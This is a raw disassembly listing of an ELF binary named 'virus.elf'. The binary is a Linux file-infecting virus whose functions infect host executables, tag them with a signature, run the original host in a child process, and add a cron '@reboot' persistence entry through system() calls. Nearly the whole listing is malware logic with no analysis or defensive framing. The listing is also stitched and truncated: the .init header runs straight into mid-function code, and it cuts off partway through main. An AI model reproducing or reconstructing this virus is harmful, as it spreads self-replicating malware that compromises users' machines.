
virus.elf:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    1e19:	48 f7 d0             	not    rax
    1e1c:	48 8d 50 ff          	lea    rdx,[rax-0x1]
    1e20:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1e27:	48 01 d0             	add    rax,rdx
    1e2a:	48 be 0a 40 72 65 62 	movabs rsi,0x746f6f626572400a
    1e31:	6f 6f 74 
    1e34:	48 89 30             	mov    QWORD PTR [rax],rsi
    1e37:	66 c7 40 08 20 00    	mov    WORD PTR [rax+0x8],0x20
    1e3d:	48 8b 95 58 fe ff ff 	mov    rdx,QWORD PTR [rbp-0x1a8]
    1e44:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1e4b:	48 89 d6             	mov    rsi,rdx
    1e4e:	48 89 c7             	mov    rdi,rax
    1e51:	e8 2a f6 ff ff       	call   1480 <strcat@plt>
    1e56:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1e5d:	48 c7 c1 ff ff ff ff 	mov    rcx,0xffffffffffffffff
    1e64:	48 89 c2             	mov    rdx,rax
    1e67:	b8 00 00 00 00       	mov    eax,0x0
    1e6c:	48 89 d7             	mov    rdi,rdx
    1e6f:	f2 ae                	repnz scas al,BYTE PTR es:[rdi]
    1e71:	48 89 c8             	mov    rax,rcx
    1e74:	48 f7 d0             	not    rax
    1e77:	48 8d 50 ff          	lea    rdx,[rax-0x1]
    1e7b:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1e82:	48 01 d0             	add    rax,rdx
    1e85:	48 be 22 20 3e 3e 20 	movabs rsi,0x6d742f203e3e2022
    1e8c:	2f 74 6d 
    1e8f:	48 89 30             	mov    QWORD PTR [rax],rsi
    1e92:	c7 40 08 70 2f 63 72 	mov    DWORD PTR [rax+0x8],0x72632f70
    1e99:	66 c7 40 0c 6f 6e    	mov    WORD PTR [rax+0xc],0x6e6f
    1e9f:	c6 40 0e 00          	mov    BYTE PTR [rax+0xe],0x0
    1ea3:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1eaa:	48 89 c7             	mov    rdi,rax
    1ead:	e8 7e f4 ff ff       	call   1330 <system@plt>
    1eb2:	48 8d 3d 56 11 00 00 	lea    rdi,[rip+0x1156]        # 300f <_IO_stdin_used+0xf>
    1eb9:	e8 72 f4 ff ff       	call   1330 <system@plt>
    1ebe:	90                   	nop
    1ebf:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    1ec3:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    1eca:	00 00 
    1ecc:	74 05                	je     1ed3 <addCron+0x162>
    1ece:	e8 2d f4 ff ff       	call   1300 <__stack_chk_fail@plt>
    1ed3:	c9                   	leave  
    1ed4:	c3                   	ret    

0000000000001ed5 <infectHostFile>:
    1ed5:	f3 0f 1e fa          	endbr64 
    1ed9:	55                   	push   rbp
    1eda:	48 89 e5             	mov    rbp,rsp
    1edd:	48 81 ec c0 00 00 00 	sub    rsp,0xc0
    1ee4:	48 89 bd 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],rdi
    1eeb:	89 b5 44 ff ff ff    	mov    DWORD PTR [rbp-0xbc],esi
    1ef1:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1ef8:	00 00 
    1efa:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1efe:	31 c0                	xor    eax,eax
    1f00:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
    1f07:	48 89 c7             	mov    rdi,rax
    1f0a:	e8 62 fe ff ff       	call   1d71 <addCron>
    1f0f:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
    1f16:	be 00 00 00 00       	mov    esi,0x0
    1f1b:	48 89 c7             	mov    rdi,rax
    1f1e:	b8 00 00 00 00       	mov    eax,0x0
    1f23:	e8 18 f5 ff ff       	call   1440 <open@plt>
    1f28:	89 85 54 ff ff ff    	mov    DWORD PTR [rbp-0xac],eax
    1f2e:	48 8d 95 60 ff ff ff 	lea    rdx,[rbp-0xa0]
    1f35:	8b 85 54 ff ff ff    	mov    eax,DWORD PTR [rbp-0xac]
    1f3b:	48 89 d6             	mov    rsi,rdx
    1f3e:	89 c7                	mov    edi,eax
    1f40:	e8 6b 08 00 00       	call   27b0 <__fstat>
    1f45:	48 8b 45 90          	mov    rax,QWORD PTR [rbp-0x70]
    1f49:	89 85 58 ff ff ff    	mov    DWORD PTR [rbp-0xa8],eax
    1f4f:	8b 85 78 ff ff ff    	mov    eax,DWORD PTR [rbp-0x88]
    1f55:	89 c6                	mov    esi,eax
    1f57:	48 8d 3d c3 10 00 00 	lea    rdi,[rip+0x10c3]        # 3021 <_IO_stdin_used+0x21>
    1f5e:	e8 2d f5 ff ff       	call   1490 <creat@plt>
    1f63:	89 85 5c ff ff ff    	mov    DWORD PTR [rbp-0xa4],eax
    1f69:	8b b5 44 ff ff ff    	mov    esi,DWORD PTR [rbp-0xbc]
    1f6f:	8b 85 5c ff ff ff    	mov    eax,DWORD PTR [rbp-0xa4]
    1f75:	b9 a8 59 00 00       	mov    ecx,0x59a8
    1f7a:	ba 00 00 00 00       	mov    edx,0x0
    1f7f:	89 c7                	mov    edi,eax
    1f81:	e8 8a f4 ff ff       	call   1410 <sendfile@plt>
    1f86:	8b 85 58 ff ff ff    	mov    eax,DWORD PTR [rbp-0xa8]
    1f8c:	48 63 d0             	movsxd rdx,eax
    1f8f:	8b b5 54 ff ff ff    	mov    esi,DWORD PTR [rbp-0xac]
    1f95:	8b 85 5c ff ff ff    	mov    eax,DWORD PTR [rbp-0xa4]
    1f9b:	48 89 d1             	mov    rcx,rdx
    1f9e:	ba 00 00 00 00       	mov    edx,0x0
    1fa3:	89 c7                	mov    edi,eax
    1fa5:	e8 66 f4 ff ff       	call   1410 <sendfile@plt>
    1faa:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
    1fb1:	48 89 c6             	mov    rsi,rax
    1fb4:	48 8d 3d 66 10 00 00 	lea    rdi,[rip+0x1066]        # 3021 <_IO_stdin_used+0x21>
    1fbb:	e8 a0 f4 ff ff       	call   1460 <rename@plt>
    1fc0:	8b 85 5c ff ff ff    	mov    eax,DWORD PTR [rbp-0xa4]
    1fc6:	89 c7                	mov    edi,eax
    1fc8:	e8 a3 f3 ff ff       	call   1370 <close@plt>
    1fcd:	8b 85 54 ff ff ff    	mov    eax,DWORD PTR [rbp-0xac]
    1fd3:	89 c7                	mov    edi,eax
    1fd5:	e8 96 f3 ff ff       	call   1370 <close@plt>
    1fda:	90                   	nop
    1fdb:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    1fdf:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    1fe6:	00 00 
    1fe8:	74 05                	je     1fef <infectHostFile+0x11a>
    1fea:	e8 11 f3 ff ff       	call   1300 <__stack_chk_fail@plt>
    1fef:	c9                   	leave  
    1ff0:	c3                   	ret    

0000000000001ff1 <executeHostPart>:
    1ff1:	f3 0f 1e fa          	endbr64 
    1ff5:	55                   	push   rbp
    1ff6:	48 89 e5             	mov    rbp,rsp
    1ff9:	48 83 ec 30          	sub    rsp,0x30
    1ffd:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
    2000:	89 75 e8             	mov    DWORD PTR [rbp-0x18],esi
    2003:	89 55 e4             	mov    DWORD PTR [rbp-0x1c],edx
    2006:	48 89 4d d8          	mov    QWORD PTR [rbp-0x28],rcx
    200a:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
    200d:	89 c6                	mov    esi,eax
    200f:	48 8d 3d 0b 10 00 00 	lea    rdi,[rip+0x100b]        # 3021 <_IO_stdin_used+0x21>
    2016:	e8 75 f4 ff ff       	call   1490 <creat@plt>
    201b:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
    201e:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
    2021:	ba 00 00 00 00       	mov    edx,0x0
    2026:	be a8 59 00 00       	mov    esi,0x59a8
    202b:	89 c7                	mov    edi,eax
    202d:	e8 2e f3 ff ff       	call   1360 <lseek@plt>
    2032:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
    2035:	2d a8 59 00 00       	sub    eax,0x59a8
    203a:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
    203d:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
    2040:	48 63 d0             	movsxd rdx,eax
    2043:	8b 75 ec             	mov    esi,DWORD PTR [rbp-0x14]
    2046:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
    2049:	48 89 d1             	mov    rcx,rdx
    204c:	ba 00 00 00 00       	mov    edx,0x0
    2051:	89 c7                	mov    edi,eax
    2053:	e8 b8 f3 ff ff       	call   1410 <sendfile@plt>
    2058:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
    205b:	89 c7                	mov    edi,eax
    205d:	e8 0e f3 ff ff       	call   1370 <close@plt>
    2062:	e8 59 f4 ff ff       	call   14c0 <fork@plt>
    2067:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
    206a:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
    206e:	75 15                	jne    2085 <executeHostPart+0x94>
    2070:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
    2074:	48 89 c6             	mov    rsi,rax
    2077:	48 8d 3d a3 0f 00 00 	lea    rdi,[rip+0xfa3]        # 3021 <_IO_stdin_used+0x21>
    207e:	e8 2d f4 ff ff       	call   14b0 <execv@plt>
    2083:	eb 20                	jmp    20a5 <executeHostPart+0xb4>
    2085:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    2088:	ba 00 00 00 00       	mov    edx,0x0
    208d:	be 00 00 00 00       	mov    esi,0x0
    2092:	89 c7                	mov    edi,eax
    2094:	e8 97 f3 ff ff       	call   1430 <waitpid@plt>
    2099:	48 8d 3d 81 0f 00 00 	lea    rdi,[rip+0xf81]        # 3021 <_IO_stdin_used+0x21>
    20a0:	e8 fb f1 ff ff       	call   12a0 <unlink@plt>
    20a5:	90                   	nop
    20a6:	c9                   	leave  
    20a7:	c3                   	ret    

00000000000020a8 <addSignatureToELFPadding>:
    20a8:	f3 0f 1e fa          	endbr64 
    20ac:	55                   	push   rbp
    20ad:	48 89 e5             	mov    rbp,rsp
    20b0:	48 81 ec c0 00 00 00 	sub    rsp,0xc0
    20b7:	89 bd 4c ff ff ff    	mov    DWORD PTR [rbp-0xb4],edi
    20bd:	48 89 b5 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rsi
    20c4:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    20cb:	00 00 
    20cd:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    20d1:	31 c0                	xor    eax,eax
    20d3:	8b 85 4c ff ff ff    	mov    eax,DWORD PTR [rbp-0xb4]
    20d9:	ba 00 00 00 00       	mov    edx,0x0
    20de:	be 00 00 00 00       	mov    esi,0x0
    20e3:	89 c7                	mov    edi,eax
    20e5:	e8 76 f2 ff ff       	call   1360 <lseek@plt>
    20ea:	48 8d 95 60 ff ff ff 	lea    rdx,[rbp-0xa0]
    20f1:	8b 85 4c ff ff ff    	mov    eax,DWORD PTR [rbp-0xb4]
    20f7:	48 89 d6             	mov    rsi,rdx
    20fa:	89 c7                	mov    edi,eax
    20fc:	e8 af 06 00 00       	call   27b0 <__fstat>
    2101:	48 8b 45 90          	mov    rax,QWORD PTR [rbp-0x70]
    2105:	48 89 c6             	mov    rsi,rax
    2108:	8b 85 4c ff ff ff    	mov    eax,DWORD PTR [rbp-0xb4]
    210e:	41 b9 00 00 00 00    	mov    r9d,0x0
    2114:	41 89 c0             	mov    r8d,eax
    2117:	b9 02 00 00 00       	mov    ecx,0x2
    211c:	ba 03 00 00 00       	mov    edx,0x3
    2121:	bf 00 00 00 00       	mov    edi,0x0
    2126:	e8 f5 f1 ff ff       	call   1320 <mmap@plt>
    212b:	48 89 85 58 ff ff ff 	mov    QWORD PTR [rbp-0xa8],rax
    2132:	48 8b 85 58 ff ff ff 	mov    rax,QWORD PTR [rbp-0xa8]
    2139:	48 83 c0 09          	add    rax,0x9
    213d:	c7 00 25 5d 01 00    	mov    DWORD PTR [rax],0x15d25
    2143:	8b 85 78 ff ff ff    	mov    eax,DWORD PTR [rbp-0x88]
    2149:	89 c6                	mov    esi,eax
    214b:	48 8d 3d cf 0e 00 00 	lea    rdi,[rip+0xecf]        # 3021 <_IO_stdin_used+0x21>
    2152:	e8 39 f3 ff ff       	call   1490 <creat@plt>
    2157:	89 85 54 ff ff ff    	mov    DWORD PTR [rbp-0xac],eax
    215d:	48 8b 45 90          	mov    rax,QWORD PTR [rbp-0x70]
    2161:	48 89 c2             	mov    rdx,rax
    2164:	48 8b 8d 58 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa8]
    216b:	8b 85 54 ff ff ff    	mov    eax,DWORD PTR [rbp-0xac]
    2171:	48 89 ce             	mov    rsi,rcx
    2174:	89 c7                	mov    edi,eax
    2176:	e8 65 f1 ff ff       	call   12e0 <write@plt>
    217b:	48 8b 45 90          	mov    rax,QWORD PTR [rbp-0x70]
    217f:	48 89 c2             	mov    rdx,rax
    2182:	48 8b 85 58 ff ff ff 	mov    rax,QWORD PTR [rbp-0xa8]
    2189:	48 89 d6             	mov    rsi,rdx
    218c:	48 89 c7             	mov    rdi,rax
    218f:	e8 8c f2 ff ff       	call   1420 <munmap@plt>
    2194:	8b 85 54 ff ff ff    	mov    eax,DWORD PTR [rbp-0xac]
    219a:	89 c7                	mov    edi,eax
    219c:	e8 cf f1 ff ff       	call   1370 <close@plt>
    21a1:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
    21a8:	48 89 c6             	mov    rsi,rax
    21ab:	48 8d 3d 6f 0e 00 00 	lea    rdi,[rip+0xe6f]        # 3021 <_IO_stdin_used+0x21>
    21b2:	e8 a9 f2 ff ff       	call   1460 <rename@plt>
    21b7:	90                   	nop
    21b8:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    21bc:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    21c3:	00 00 
    21c5:	74 05                	je     21cc <addSignatureToELFPadding+0x124>
    21c7:	e8 34 f1 ff ff       	call   1300 <__stack_chk_fail@plt>
    21cc:	c9                   	leave  
    21cd:	c3                   	ret    

00000000000021ce <makeCopyAndAddSignature>:
    21ce:	f3 0f 1e fa          	endbr64 
    21d2:	55                   	push   rbp
    21d3:	48 89 e5             	mov    rbp,rsp
    21d6:	48 81 ec c0 01 00 00 	sub    rsp,0x1c0
    21dd:	48 89 bd 48 fe ff ff 	mov    QWORD PTR [rbp-0x1b8],rdi
    21e4:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    21eb:	00 00 
    21ed:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    21f1:	31 c0                	xor    eax,eax
    21f3:	48 8b 95 48 fe ff ff 	mov    rdx,QWORD PTR [rbp-0x1b8]
    21fa:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    2201:	48 89 d6             	mov    rsi,rdx
    2204:	48 89 c7             	mov    rdi,rax
    2207:	e8 b4 f0 ff ff       	call   12c0 <strcpy@plt>
    220c:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    2213:	c7 00 63 70 20 00    	mov    DWORD PTR [rax],0x207063
    2219:	48 8d 95 60 fe ff ff 	lea    rdx,[rbp-0x1a0]
    2220:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    2227:	48 89 d6             	mov    rsi,rdx
    222a:	48 89 c7             	mov    rdi,rax
    222d:	e8 4e f2 ff ff       	call   1480 <strcat@plt>
    2232:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    2239:	48 c7 c1 ff ff ff ff 	mov    rcx,0xffffffffffffffff
    2240:	48 89 c2             	mov    rdx,rax
    2243:	b8 00 00 00 00       	mov    eax,0x0
    2248:	48 89 d7             	mov    rdi,rdx
    224b:	f2 ae                	repnz scas al,BYTE PTR es:[rdi]
    224d:	48 89 c8             	mov    rax,rcx
    2250:	48 f7 d0             	not    rax
    2253:	48 8d 50 ff          	lea    rdx,[rax-0x1]
    2257:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    225e:	48 01 d0             	add    rax,rdx
    2261:	66 c7 00 20 00       	mov    WORD PTR [rax],0x20
    2266:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    226d:	48 c7 c1 ff ff ff ff 	mov    rcx,0xffffffffffffffff
    2274:	48 89 c2             	mov    rdx,rax
    2277:	b8 00 00 00 00       	mov    eax,0x0
    227c:	48 89 d7             	mov    rdi,rdx
    227f:	f2 ae                	repnz scas al,BYTE PTR es:[rdi]
    2281:	48 89 c8             	mov    rax,rcx
    2284:	48 f7 d0             	not    rax
    2287:	48 8d 50 ff          	lea    rdx,[rax-0x1]
    228b:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    2292:	48 01 d0             	add    rax,rdx
    2295:	66 c7 00 32 00       	mov    WORD PTR [rax],0x32
    229a:	48 8d 95 60 fe ff ff 	lea    rdx,[rbp-0x1a0]
    22a1:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    22a8:	48 89 d6             	mov    rsi,rdx
    22ab:	48 89 c7             	mov    rdi,rax
    22ae:	e8 cd f1 ff ff       	call   1480 <strcat@plt>
    22b3:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    22ba:	48 89 c7             	mov    rdi,rax
    22bd:	e8 6e f0 ff ff       	call   1330 <system@plt>
    22c2:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    22c9:	be 02 00 00 00       	mov    esi,0x2
    22ce:	48 89 c7             	mov    rdi,rax
    22d1:	b8 00 00 00 00       	mov    eax,0x0
    22d6:	e8 65 f1 ff ff       	call   1440 <open@plt>
    22db:	89 85 5c fe ff ff    	mov    DWORD PTR [rbp-0x1a4],eax
    22e1:	48 8b 95 48 fe ff ff 	mov    rdx,QWORD PTR [rbp-0x1b8]
    22e8:	8b 85 5c fe ff ff    	mov    eax,DWORD PTR [rbp-0x1a4]
    22ee:	48 89 d6             	mov    rsi,rdx
    22f1:	89 c7                	mov    edi,eax
    22f3:	e8 b0 fd ff ff       	call   20a8 <addSignatureToELFPadding>
    22f8:	8b 85 5c fe ff ff    	mov    eax,DWORD PTR [rbp-0x1a4]
    22fe:	89 c7                	mov    edi,eax
    2300:	e8 6b f0 ff ff       	call   1370 <close@plt>
    2305:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    230c:	48 89 c7             	mov    rdi,rax
    230f:	e8 9c ef ff ff       	call   12b0 <remove@plt>
    2314:	90                   	nop
    2315:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    2319:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    2320:	00 00 
    2322:	74 05                	je     2329 <makeCopyAndAddSignature+0x15b>
    2324:	e8 d7 ef ff ff       	call   1300 <__stack_chk_fail@plt>
    2329:	c9                   	leave  
    232a:	c3                   	ret    

000000000000232b <loadCleanHostfile>:
    232b:	f3 0f 1e fa          	endbr64 
    232f:	55                   	push   rbp
    2330:	48 89 e5             	mov    rbp,rsp
    2333:	48 81 ec 90 04 00 00 	sub    rsp,0x490
    233a:	48 89 bd 78 fb ff ff 	mov    QWORD PTR [rbp-0x488],rdi
    2341:	48 89 b5 70 fb ff ff 	mov    QWORD PTR [rbp-0x490],rsi
    2348:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    234f:	00 00 
    2351:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    2355:	31 c0                	xor    eax,eax
    2357:	48 8d 05 d2 0c 00 00 	lea    rax,[rip+0xcd2]        # 3030 <_IO_stdin_used+0x30>
    235e:	48 89 85 90 fb ff ff 	mov    QWORD PTR [rbp-0x470],rax
    2365:	48 8d 05 ca 0c 00 00 	lea    rax,[rip+0xcca]        # 3036 <_IO_stdin_used+0x36>
    236c:	48 89 85 98 fb ff ff 	mov    QWORD PTR [rbp-0x468],rax
    2373:	48 8d 05 c6 0c 00 00 	lea    rax,[rip+0xcc6]        # 3040 <_IO_stdin_used+0x40>
    237a:	48 89 85 a0 fb ff ff 	mov    QWORD PTR [rbp-0x460],rax
    2381:	48 8d 05 bd 0c 00 00 	lea    rax,[rip+0xcbd]        # 3045 <_IO_stdin_used+0x45>
    2388:	48 89 85 a8 fb ff ff 	mov    QWORD PTR [rbp-0x458],rax
    238f:	48 b8 2f 68 6f 6d 65 	movabs rax,0x2f656d6f682f
    2396:	2f 00 00 
    2399:	ba 00 00 00 00       	mov    edx,0x0
    239e:	48 89 85 f0 fb ff ff 	mov    QWORD PTR [rbp-0x410],rax
    23a5:	48 89 95 f8 fb ff ff 	mov    QWORD PTR [rbp-0x408],rdx
    23ac:	48 8d 95 00 fc ff ff 	lea    rdx,[rbp-0x400]
    23b3:	b8 00 00 00 00       	mov    eax,0x0
    23b8:	b9 7e 00 00 00       	mov    ecx,0x7e
    23bd:	48 89 d7             	mov    rdi,rdx
    23c0:	f3 48 ab             	rep stos QWORD PTR es:[rdi],rax
    23c3:	48 8d 85 b0 fb ff ff 	lea    rax,[rbp-0x450]
    23ca:	48 89 c7             	mov    rdi,rax
    23cd:	b8 00 00 00 00       	mov    eax,0x0
    23d2:	e8 79 f0 ff ff       	call   1450 <cuserid@plt>
    23d7:	48 8d 95 b0 fb ff ff 	lea    rdx,[rbp-0x450]
    23de:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    23e5:	48 89 d6             	mov    rsi,rdx
    23e8:	48 89 c7             	mov    rdi,rax
    23eb:	e8 90 f0 ff ff       	call   1480 <strcat@plt>
    23f0:	e8 1b ef ff ff       	call   1310 <getuid@plt>
    23f5:	85 c0                	test   eax,eax
    23f7:	74 09                	je     2402 <loadCleanHostfile+0xd7>
    23f9:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    2400:	eb 0f                	jmp    2411 <loadCleanHostfile+0xe6>
    2402:	48 8d 85 90 fb ff ff 	lea    rax,[rbp-0x470]
    2409:	48 89 c7             	mov    rdi,rax
    240c:	e8 d5 f1 ff ff       	call   15e6 <randomly_select_dir>
    2411:	48 89 85 88 fb ff ff 	mov    QWORD PTR [rbp-0x478],rax
    2418:	48 8b 95 88 fb ff ff 	mov    rdx,QWORD PTR [rbp-0x478]
    241f:	48 8b b5 70 fb ff ff 	mov    rsi,QWORD PTR [rbp-0x490]
    2426:	48 8b 85 78 fb ff ff 	mov    rax,QWORD PTR [rbp-0x488]
    242d:	b9 00 00 00 00       	mov    ecx,0x0
    2432:	48 89 c7             	mov    rdi,rax
    2435:	e8 a6 f6 ff ff       	call   1ae0 <getHealthyHostFile>
    243a:	90                   	nop
    243b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    243f:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    2446:	00 00 
    2448:	74 05                	je     244f <loadCleanHostfile+0x124>
    244a:	e8 b1 ee ff ff       	call   1300 <__stack_chk_fail@plt>
    244f:	c9                   	leave  
    2450:	c3                   	ret    

0000000000002451 <main>:
    2451:	f3 0f 1e fa          	endbr64 
    2455:	55                   	push   rbp
    2456:	48 89 e5             	mov    rbp,rsp
    2459:	48 81 ec d0 08 00 00 	sub    rsp,0x8d0
    2460:	89 bd 3c f7 ff ff    	mov    DWORD PTR [rbp-0x8c4],edi
    2466:	48 89 b5 30 f7 ff ff 	mov    QWORD PTR [rbp-0x8d0],rsi
    246d:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    2474:	00 00 
    2476:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    247a:	31 c0                	xor    eax,eax
    247c:	bf 00 00 00 00       	mov    edi,0x0
    2481:	e8 4a ef ff ff       	call   13d0 <time@plt>
    2486:	89 c7                	mov    edi,eax
    2488:	e8 13 ef ff ff       	call   13a0 <srand@plt>
    248d:	48 8b 85 30 f7 ff ff 	mov    rax,QWORD PTR [rbp-0x8d0]
    2494:	48 8b 00             	mov    rax,QWORD PTR [rax]
    2497:	48 89 c7             	mov    rdi,rax
    249a:	e8 2f fd ff ff       	call   21ce <makeCopyAndAddSignature>
    249f:	48 8b 85 30 f7 ff ff 	mov    rax,QWORD PTR [rbp-0x8d0]
    24a6:	48 8b 00             	mov    rax,QWORD PTR [rax]
    24a9:	be 02 00 00 00       	mov    esi,0x2
    24ae:	48 89 c7             	mov    rdi,rax
    24b1:	b8 00 00 00 00       	mov    eax,0x0
    24b6:	e8 85 ef ff ff       	call   1440 <open@plt>
    24bb:	89 85 4c f7 ff ff    	mov    DWORD PTR [rbp-0x8b4],eax
    24c1:	48 8d 95 60 f7 ff ff 	lea    rdx,[rbp-0x8a0]
    24c8:	8b 85 4c f7 ff ff    	mov    eax,DWORD PTR [rbp-0x8b4]
    24ce:	48 89 d6             	mov    rsi,rdx
    24d1:	89 c7                	mov    edi,eax
    24d3:	e8 d8 02 00 00       	call   27b0 <__fstat>
    24d8:	48 c7 85 f0 f7 ff ff 	mov    QWORD PTR [rbp-0x810],0x0
    24df:	00 00 00 00 
    24e3:	48 c7 85 f8 f7 ff ff 	mov    QWORD PTR [rbp-0x808],0x0
    24ea:	00 00 00 00 
    24ee:	48 8d 95 00 f8 ff ff 	lea    rdx,[rbp-0x800]
    24f5:	b8 00 00 00 00       	mov    eax,0x0
    24fa:	b9 7e 00 00 00       	mov    ecx,0x7e
    24ff:	48 89 d7             	mov    rdi,rdx
    2502:	f3 48 ab             	rep stos QWORD PTR es:[rdi],rax
    2505:	48 8b 85 30 f7 ff ff 	mov    rax,QWORD PTR [rbp-0x8d0]
    250c:	48 8b 00             	mov    rax,QWORD PTR [rax]
    250f:	48 8d 50 02          	lea    rdx,[rax+0x2]
    2513:	48 8d 85 f0 f7 ff ff 	lea    rax,[rbp-0x810]
    251a:	48 89 d6             	mov    rsi,rdx
    251d:	48 89 c7             	mov    rdi,rax
    2520:	e8 06 fe ff ff       	call   232b <loadCleanHostfile>
    2525:	48 8d 85 f0 f7 ff ff 	lea    rax,[rbp-0x810]
    252c:	48 89 c6             	mov    rsi,rax
    252f:	48 8d 3d 18 0b 00 00 	lea    rdi,[rip+0xb18]        # 304e <_IO_stdin_used+0x4e>
    2536:	b8 00 00 00 00       	mov    eax,0x0
    253b:	e8 00 ee ff ff       	call   1340 <printf@plt>
    2540:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    2547:	c7 00 65 63 68 6f    	mov    DWORD PTR [rax],0x6f686365
    254d:	66 c7 40 04 20 00    	mov    WORD PTR [rax+0x4],0x20
    2553:	48 8d 95 f0 f7 ff ff 	lea    rdx,[rbp-0x810]
    255a:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    2561:	48 89 d6             	mov    rsi,rdx
    2564:	48 89 c7             	mov    rdi,rax
    2567:	e8 14 ef ff ff       	call   1480 <strcat@plt>
    256c:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    2573:	48 c7 c1 ff ff ff ff 	mov    rcx,0xffffffffffffffff
    257a:	48 89 c2             	mov    rdx,rax
    257d:	b8 00 00 00 00       	mov    eax,0x0
